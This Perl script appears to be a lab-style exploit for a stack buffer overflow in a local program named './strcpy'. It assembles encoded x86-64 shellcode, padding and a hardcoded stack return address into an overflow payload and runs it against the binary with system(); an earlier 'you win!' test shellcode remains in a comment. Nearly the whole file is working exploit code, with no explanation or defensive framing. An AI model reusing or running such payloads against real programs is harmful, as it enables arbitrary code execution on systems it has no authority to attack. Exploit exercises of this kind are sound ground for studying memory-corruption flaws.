#!/usr/bin/env perl

use strict;

# my $fill = "A" x (48 + 8 - 36);

#shellcode you win! (length 36)
#my $shellcode = "\xeb\x15\x59\x31\xc0\xb0\x04\x31\xdb\xff\xc3\x31\xd2\xb2\x08\xcd\x80\xb0\x01\xff\xcb\xcd\x80\xe8\xe6\xff\xff\xff\x79\x6f\x75\x20\x77\x69\x6e\x21";

my $shellcode = 
"\x48\x31\xc9\x48\x81\xe9\xf9\xff\xff\xff\x48\x8d\x05\xef" .
"\xff\xff\xff\x48\xbb\x25\x21\x27\xa2\xad\x9f\x23\x50\x48" .
"\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x4f\x1a\x7f" .
"\x3b\xe5\x24\x0c\x32\x4c\x4f\x08\xd1\xc5\x9f\x70\x18\xac" .
"\xc6\x4f\x8f\xce\x9f\x23\x18\xac\xc7\x75\x4a\xa7\x9f\x23" .
"\x50\x40\x42\x4f\xcd\x8d\xcf\x74\x1e\x61\x21\x71\xf5\xe5" .
"\x16\xc5\x5f\x20\x21\x27\xa2\xad\x9f\x23\x50"; # 95 bytes


my $fill = "A" x (128 + 8 - 95);

#my $shellcode = "\xcd\x80\xeb\xfe";

# start of buf @ 0x7fffffffdb70
my $address = "\x70\xdb\xff\xff\xff\x7f";

my $arg = $shellcode.$fill.$address;

#my $filename = 'arg.out';
#open(my $fh, '>', $filename) or die "Could not open file '$filename' $!";
#print $fh $arg;
#close $fh;
#print "done\n";

my $a = "\x48\x31\xc9\x48\x81\xe9\xf9\xff\xff\xff\x48\x8d\x05\xef\xff\xff\xff\x48\xbb\xc5\xb6\x57\xcc\xbf\x7a\x60\xc7\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xaf\x8d\x0f\x55\xf7\xc1\x4f\xa5\xac\xd8\x78\xbf\xd7\x7a\x33\x8f\x4c\x51\x3f\xe1\xdc\x7a\x60\x8f\x4c\x50\x05\x24\xb5\x7a\x60\xc7\xa0\xd5\x3f\xa3\x9f\x2a\x37\x89\x81\xb6\x01\x9b\xf7\xf3\x86\xc8\xc0\xb6\x57\xcc\xbf\x7a\x60\xc7\x24\xFF\x24\xFF\x24\xFF\x24\xFF\x24\xFF\x24\xFF\x24\xFF\x24\xFF\x24\xFF\x24\xFF\x24\xFF\x24\xFF\x24\xFF\x24\xFF\x24\xFF\x24\xFF\x24\xFF\x24\xFF\x24\xFF\x24\xFF\x90\x70\xe5\xff\xff\xff\x7f";

my $cmd = "./strcpy " . $a;

#print($cmd."\n");

system($cmd. " 2>&1");
# print $arg; 
